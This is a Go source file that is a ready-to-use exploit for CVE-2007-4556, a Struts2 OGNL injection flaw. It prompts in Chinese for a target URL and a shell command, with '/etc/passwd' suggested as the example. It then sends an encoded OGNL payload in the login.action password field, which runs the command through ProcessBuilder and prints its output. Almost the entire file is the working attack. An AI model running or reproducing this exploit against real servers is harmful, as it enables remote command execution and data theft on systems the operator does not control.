/*
 * @Author: twsec
 * @Date: 2022-12-20 09:29:38
 * @LastEditors: twsec
 * @LastEditTime: 2022-12-20 18:01:00
 * @Description:
 */
package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"

	_ "github.com/aloxc/gobanner/banner"
)

func main() {

	//输出多行字符串
	fmt.Println(`CVE-2007-4556-EXP编译合适的版本，根据提示输入地址和命令即可执行命令！
		

		想念你的时候，我会用你的名字喊醒自己。

							--《我想和你叙叙旧》`)

	var Url string
	var Cmd string
	fmt.Println("请输入地址(http://xxxx.xxx/)：")
	fmt.Scanln(&Url)
	fmt.Println("请输入要执行的命令(\"cat\",\"/etc/passwd\")：")
	fmt.Scanln(&Cmd)
	httpRequest(Url, Cmd)

}

func httpRequest(Url string, cmd string) *http.Response {
	targetUrl := Url + "login.action"
	headers := map[string]string{
		"Content-Length":            "594",
		"Cache-Control":             "max-age=0",
		"Upgrade-Insecure-Requests": "1",
		"Content-Type":              "application/x-www-form-urlencoded",
		"User-Agent":                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.62",
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"Accept-Language":           "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
	}
	//cmd 进行url编码
	cmd = url.QueryEscape(cmd)
	var data1 string = ("username=1212&password=")
	var data2 string = ("%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B")
	var data3 string = ("%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D")
	var data string = data1 + data2 + cmd + data3

	//data进行url解码

	//fmt.Println(data)
	request, _ := http.NewRequest(http.MethodPost, targetUrl, bytes.NewBuffer([]byte(data)))
	for k, v := range headers {
		request.Header.Set(k, v)

	}

	customTransport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: customTransport}
	response, error := client.Do(request)
	if error != nil {
		panic("命令有误！")
	}

	defer response.Body.Close()
	//获取响应body
	body, _ := io.ReadAll(response.Body)

	//如果状态码为200，输出响应body
	if response.StatusCode == 200 {
		fmt.Println("命令执行成功！")
		fmt.Println(string(body))
	} else {
		fmt.Println("命令执行失败！")
		fmt.Println(response.StatusCode)
	}

	return response
}
